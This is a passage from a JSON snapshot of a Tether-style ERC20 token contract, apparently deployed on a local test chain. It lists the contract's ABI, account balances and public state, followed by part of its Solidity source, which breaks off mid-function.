"setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return 